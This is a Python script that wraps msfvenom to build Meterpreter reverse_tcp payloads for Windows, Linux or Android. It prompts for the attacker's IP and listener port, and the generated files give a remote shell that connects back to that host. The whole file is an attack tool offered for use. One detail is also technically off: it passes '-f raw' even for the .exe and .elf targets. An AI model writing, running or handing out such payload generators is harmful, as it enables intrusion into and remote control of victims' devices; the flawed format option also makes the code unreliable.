import subprocess
import os 
# Function to display the banner
def banner():
    print("""
    ------------------------------------------
    MSFVENOM PAYLOAD GENERATOR (Python)
    ------------------------------------------
    """)

# Function to collect user input
def get_user_input():
    lhost = input("Enter LHOST (your IP): ")  # Attacker's IP address
    lport = input("Enter LPORT (your listener port): ")  # Port that will receive connection

    # OS selection menu
    print("Choose target OS:")
    print("1. Windows")
    print("2. Linux")
    print("3. Android")
    os_choice = input("Enter choice (1-3): ")

    # Dictionary mapping OS
    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp"
    }

    # Dictionary mapping
    extensions = {
        "1": ".exe",
        "2": ".elf",
        "3": ".apk"
    }

    # If the user enters an invalid option, it exits
    if os_choice not in payloads:
        print("Invalid choice. Exiting.")
        exit()

    # Return the selected payload, file extension, LHOST, and LPORT
    return payloads[os_choice], extensions[os_choice], lhost, lport

# Function to build and execute the msfvenom command
def generate_payload(payload, extension, lhost, lport):
    filename = f"payload{extension}"  # Construct output filename
    print(f"\n[+] Generating payload: {filename}")

    # Constructs the msfvenom command as a list
    command = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", filename
    ]

    # Run the command
    try:
        subprocess.run(command, check=True)
        print(f"[+] Payload saved as: {filename}")
    except subprocess.CalledProcessError:
        print("[-] Payload generation failed.")

# Main function
def main():
    banner()  # Display banner
    payload, extension, lhost, lport = get_user_input()  # Get user inputs
    generate_payload(payload, extension, lhost, lport)  # Create the payload

# Runs the main function if this script is executed
if __name__ == "__main__":
    main()
